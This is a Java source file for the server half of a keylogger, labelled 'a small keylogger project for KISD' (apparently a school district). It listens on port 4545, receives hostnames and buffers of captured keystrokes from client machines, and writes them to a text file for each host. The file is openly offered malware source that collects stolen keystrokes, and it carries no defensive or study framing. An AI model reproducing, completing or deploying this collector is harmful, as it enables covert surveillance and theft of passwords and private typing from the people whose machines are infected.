package org.killeenisd;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Date;

/**
 * A small keylogger project for KISD.
 * 
 * @author Desmond Jackson
 */
public class JStrokeServer extends Object {

	/**
	 * The main method.
	 * 
	 * @param args Any string arguments passed to this program
	 */
	public static void main(String[] args) throws IOException {
		ServerSocket ss = new ServerSocket(4545);
		while (true) {
			final Socket socket = ss.accept();
			new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						DataInputStream din = new DataInputStream(socket.getInputStream());
						din.readInt();
						String hostname = din.readUTF();
						din.readInt();
						String buffer = din.readUTF();
						din.readInt();
						store(hostname, buffer);
						din.close();
						socket.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}

			}).start();
		}
	}

	/**
	 * Stores the captured keys in a text file.
	 * 
	 * @param hostname The hostname of the computer who sent captured keys
	 * 
	 * @param buffer The actual keys that were captured
	 * 
	 * @throws IOException
	 */
	private static synchronized void store(String hostname, String buffer) throws IOException {
		File file = new File(hostname + ".txt");
		if (!file.exists())
			file.createNewFile();
		FileWriter fw = new FileWriter(file, true);
		fw.write(new Date(System.currentTimeMillis()) + ": " + buffer);
		fw.write("\n\n");
		fw.close();
	}

}
